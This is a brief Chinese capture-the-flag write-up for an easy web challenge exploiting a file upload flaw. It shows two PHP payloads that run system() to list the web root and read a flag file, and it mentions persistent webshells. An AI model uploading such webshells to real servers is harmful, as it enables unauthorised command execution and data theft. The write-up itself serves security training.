### 1.题目名称

quick upload



### 2.题目类型

web(easy)



### 3.考察知识点

文件上传漏洞/php脚本能力



### 4.解题思路

测试后发现，存在文件上传漏洞，但是上传的php文件很快会被删除。所以，此处上传的php脚本和普通的一句话木马不一样，应当是直接访问执行的php木马，或者是不死马。

示例：

```Php
<?php system('ls /var/www/html');?>
```

```php
<?php system('cat flag_efc311a92467d0db4712ed8acf7cb749.php');?>
```













